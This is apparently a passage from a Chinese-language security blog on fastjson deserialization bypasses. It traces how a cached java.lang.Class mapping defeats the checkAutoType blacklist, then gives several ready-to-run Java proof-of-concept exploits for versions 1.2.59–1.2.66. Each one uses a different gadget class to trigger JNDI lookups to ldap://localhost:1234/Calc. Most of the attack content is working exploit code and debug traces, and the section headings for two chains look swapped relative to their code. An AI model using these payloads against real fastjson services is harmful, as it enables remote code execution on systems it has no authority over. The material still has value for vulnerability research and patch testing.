<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770252631-4cf12606-07b4-42e9-92da-3c3be5ff6c36.png" alt="image.png"><br>显然可过检测，java.lang.Class是可以在HashMap里直接找到的，通过findClass直接加载到，不走黑名单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:901, ParserConfig</span><br><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770549079-a7405030-6f34-4993-b522-2174c04fe139.png" alt="image.png"><br>于是加载到java.lang.Class对象并返回，下面就以类型为java.lang.Class为前提，对JSON字符串反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:384, DefaultJSONParser [2]</span><br><span class="line">parseObject:544, DefaultJSONParser [1]</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770901140-a93fb0f3-e0ba-40ed-85e1-2def8daf9f80.png" alt="image.png"><br>java.lang.Class默认调用MiscCodec#deserialze，它要求传入的JSON字符串的key&#x3D;”val”，不然抛异常；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserialze:227, MiscCodec</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771019637-d465aa1b-b99b-42d8-be01-4b2a062031fe.png" alt="image.png"><br>这也是payload为什么设置key为”val”的原因，如果key&#x3D;”val”的话，获取key的value，存入objVal&#x2F;strVal<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771218994-927e40d4-50fc-49c6-b567-109923a3f4ea.png" alt="image.png"><br>再调用TypeUtils#loadClass，加载key的value对应的类并返回，对应exp就是加载JdbcRowSetImpl对象并返回<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771618187-1ebf6032-7321-4c9e-90db-6a2569b671c5.png" alt="image.png"><br>到这里，实际上我们就已经达成了加载JdbcRowSetImpl类的目的，此时会在缓存mappings里存一份映射关系。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1242, TypeUtils</span><br><span class="line">loadClass:1206, TypeUtils</span><br><span class="line">deserialze:335, MiscCodec</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698773169563-8ef49b85-8255-4c14-a61f-4c09a543679e.png" alt="image.png"><br>接下来就是类似的，解析”b”的值是个对象，然后又发现里边的key&#x3D;”@type”，走进checkAutoType里，但是这次它可以在mappings里找到JdbcRowSetImpl这个类，因为前面有缓存，直接在这返回，不走下面的黑名单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getClassFromMapping:1202, TypeUtils</span><br><span class="line">checkAutoType:949, ParserConfig</span><br><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772581287-ec1ff9d6-5155-4356-b9a4-fb8cfb0a956a.png" alt="image.png"><br>至此，如图已绕过checkAutoType，加载到JdbcRowSetImpl这个类，后续利用JdbcRowSetImpl不再分析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:319, DefaultJSONParser [2]</span><br><span class="line">parseObject:544, DefaultJSONParser [1]</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772695940-0e69df38-a016-4cb2-ad75-21d76ca6205a.png" alt="image.png"></p>
<h1 id="1-2-25-1-2-59"><a href="#1-2-25-1-2-59" class="headerlink" title="1.2.25-1.2.59"></a>1.2.25-1.2.59</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过禁用类黑名单。</p>
<h2 id="Exp-5"><a href="#Exp-5" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需开启AutoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.zaxxer&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;HikariCP&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;3.3.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_59</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// some configrations</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h2><ul>
<li>需开启AutoTypeSupport</li>
<li>需要HikariCP组件</li>
<li>利用JNDI，受到JDK版本的限制</li>
</ul>
<h2 id="调试分析-5"><a href="#调试分析-5" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p>
<h1 id="1-2-25-1-2-61（复现失败）"><a href="#1-2-25-1-2-61（复现失败）" class="headerlink" title="1.2.25-1.2.61（复现失败）"></a>1.2.25-1.2.61（复现失败）</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过黑名单</p>
<h2 id="Exp-6"><a href="#Exp-6" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启AutoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;commons-proxy&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_61</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\&quot;,\&quot;jndiName\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;,\&quot;Object\&quot;:\&quot;a\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h2><ul>
<li>要开autoTypeSupport</li>
<li>要commons-proxy组件</li>
<li>利用了JNDI，有JDK版本限制</li>
</ul>
<h2 id="调试分析-6"><a href="#调试分析-6" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p>
<h1 id="1-2-25-1-2-62"><a href="#1-2-25-1-2-62" class="headerlink" title="1.2.25-1.2.62"></a>1.2.25-1.2.62</h1><h2 id="JndiConverter链"><a href="#JndiConverter链" class="headerlink" title="JndiConverter链"></a>JndiConverter链</h2><h3 id="补丁分析-4"><a href="#补丁分析-4" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>绕过禁用类黑名单。</p>
<h3 id="Exp-7"><a href="#Exp-7" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    复现失败</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    需要在JavaEE环境运行或含有javaee依赖</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;slide&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;slide-kernel&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;cocoon&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;cocoon-slide&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.1.11&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;javax&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;8.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_62_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor\&quot;, \&quot;parameters\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Hashtable\&quot;,\&quot;java.naming.factory.initial\&quot;:\&quot;com.sun.jndi.rmi.registry.RegistryContextFactory\&quot;,\&quot;topic-factory\&quot;:\&quot;ldap://127.0.0.1:1234/Calc\&quot;&#125;, \&quot;namespace\&quot;:\&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="限制-7"><a href="#限制-7" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要slide、cocoon和javaee组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-7"><a href="#调试分析-7" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h2 id="CocoonSlide链"><a href="#CocoonSlide链" class="headerlink" title="CocoonSlide链"></a>CocoonSlide链</h2><h3 id="补丁分析-5"><a href="#补丁分析-5" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>绕过禁用类黑名单。</p>
<h3 id="Exp-8"><a href="#Exp-8" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;4.15&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_62_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// some configrations</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="限制-8"><a href="#限制-8" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要xbean-reflect组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-8"><a href="#调试分析-8" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h1 id="1-2-25-1-2-66"><a href="#1-2-25-1-2-66" class="headerlink" title="1.2.25-1.2.66"></a>1.2.25-1.2.66</h1><h2 id="shiro链"><a href="#shiro链" class="headerlink" title="shiro链"></a>shiro链</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p>
<h3 id="Exp-9"><a href="#Exp-9" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">          &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.4&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/Calc\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="限制-9"><a href="#限制-9" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要shiro组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-9"><a href="#调试分析-9" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h2 id="anteros链"><a href="#anteros链" class="headerlink" title="anteros链"></a>anteros链</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p>
<h3 id="Exp-10"><a href="#Exp-10" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ExportException;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.codahale.metrics&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;metrics-healthchecks&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;3.0.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;Anteros-Core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.0.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_66_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="限制-10"><a href="#限制-10" class="headerlink" title="限制"></a>限制</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>需要metrics-healthchecks、Anteros-Core、Anteros-DBCP组件</li>
<li>利用JNDI，受JDK版本限制</li>
</ul>
<h3 id="调试分析-10"><a href="#调试分析-10" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p>
<h2 id="IbatisSqlmap链"><a href="#IbatisSqlmap链" class="headerlink" title="IbatisSqlmap链"></a>IbatisSqlmap链</h2><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>绕过禁用类黑名单。</p>
